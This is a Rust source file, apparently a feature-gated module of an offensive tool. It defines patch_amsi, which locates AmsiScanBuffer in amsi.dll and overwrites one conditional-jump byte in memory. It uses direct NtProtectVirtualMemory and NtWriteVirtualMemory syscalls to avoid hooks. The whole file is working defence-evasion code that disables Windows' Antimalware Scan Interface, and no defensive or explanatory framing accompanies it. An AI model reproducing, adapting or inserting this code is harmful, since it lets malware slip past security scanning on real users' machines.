#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionAMSISimplePatch")]
use std::ffi::c_void;
#[cfg(feature = "EvasionAMSISimplePatch")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionAMSISimplePatch")]
pub fn patch_amsi() -> Result<(), &'static str> {
    unsafe {
        // Load amsi.dll
        let amsi_dll = LoadLibraryA(b"amsi.dll\0".as_ptr());

        // Get AmsiScanBuffer address
        let amsi_scan_buffer = GetProcAddress(amsi_dll, b"AmsiScanBuffer\0".as_ptr());
        let amsi_scan_buffer_addr = amsi_scan_buffer.unwrap() as *mut c_void;

        // Calculate offset based on architecture
        #[cfg(target_arch = "x86")]
        let offset = 0x47;
        #[cfg(target_arch = "x86_64")]
        let offset = 0x6D;

        let patch_address = (amsi_scan_buffer_addr as usize + offset) as *mut c_void;

        // Patch byte: change JZ to JNZ (0x75)
        let patch: [u8; 1] = [0x75];

        // Change memory protection to RWX
        let mut old_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            0x40u32, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32
        );

        // Write the patch
        let mut bytes_written: usize = 0;
        let status = syscall!(
            "NtWriteVirtualMemory",
            GetCurrentProcess() as HANDLE,
            patch_address,
            patch.as_ptr() as *const c_void,
            patch.len(),
            &mut bytes_written as *mut usize
        );

        // Restore original protection
        let mut temp_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            old_protect,
            &mut temp_protect as *mut u32
        );
        Ok(())
    }
}
